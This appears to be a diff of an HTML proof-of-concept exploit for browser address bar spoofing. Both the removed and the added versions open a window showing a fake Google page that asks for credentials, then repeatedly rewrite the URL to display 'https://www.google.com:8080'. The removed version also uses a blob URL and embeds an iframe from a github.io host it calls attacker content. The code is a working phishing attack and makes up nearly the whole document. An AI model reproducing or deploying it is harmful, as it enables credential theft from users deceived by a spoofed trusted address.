@@ -1,53 +1,21 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Address Bar Spoof Bypass for M144</title>
-</head>
+<html>
 <body>
-    <button onclick="spoofBypass()">Click to Spoof Bypass</button>
-    <script>
-        function spoofBypass() {
-            // Open about:blank to bypass empty string checks
-            let win = window.open('about:blank', '_blank');
-            
-            // Payload as blob to load from attacker domain without full reload
-            const payload = `
-                <div style="text-align:center; font-family:Arial, sans-serif;">
-                    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;">
-                    <h1>This is NOT Google! (Bypassed)</h1>
-                    <p>Please enter your credentials:</p>
-                    <input type="text" placeholder="Username">
-                    <input type="password" placeholder="Password">
-                    <button>Login</button>
-                </div>
-                <script>
-                    // Loop replaceState to spoof address bar without reload (bypass rate limit with micro-delay)
-                    setInterval(() => {
-                        try {
-                            history.replaceState(null, '', 'https://www.google.com:8080/');
-                        } catch (e) {}
-                    }, 5); // Optimized interval for M144
-                <\/script>
-            `;
-            
-            // Create blob from payload, load in window to preserve content
-            const blob = new Blob([payload], { type: 'text/html' });
-            const blobUrl = URL.createObjectURL(blob);
-            
-            // Load blob in window, then embed attacker content if needed (e.g., from github.io)
-            win.location.href = blobUrl; // This loads content without changing origin initially
-            
-            // Optional: If need load from external attacker (github.io), use iframe post-load
-            setTimeout(() => {
-                const iframe = win.document.createElement('iframe');
-                iframe.src = 'https://x1337-exploit.github.io/hosting/poc/fb-mobile.html'; // Your attacker content
-                iframe.style.width = '100%';
-                iframe.style.height = '100%';
-                iframe.style.border = 'none';
-                win.document.body.appendChild(iframe);
-            }, 100); // Delay to bypass commit checks
-        }
-    </script>
+<button onclick="spoof()">Click to spoof</button>
+<script>
+function spoof() {
+    let win = window.open("", "_blank");
+    let payload = '<div style="text-align:center; font-family:Arial, sans-serif;">' +
+        '<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google Logo" style="margin-top:20px;">' +
+        '<h1>This is NOT Google!</h1>' +
+        '<p>Please enter your credentials:</p>' +
+        '</div>';
+    win.document.write(payload);
+    win.document.close();
+    setInterval(function() {
+        win.location.replace("https://www.google.com:8080");
+    }, 10);  // Small interval to preserve the spoof
+}
+</script>
 </body>
 </html>
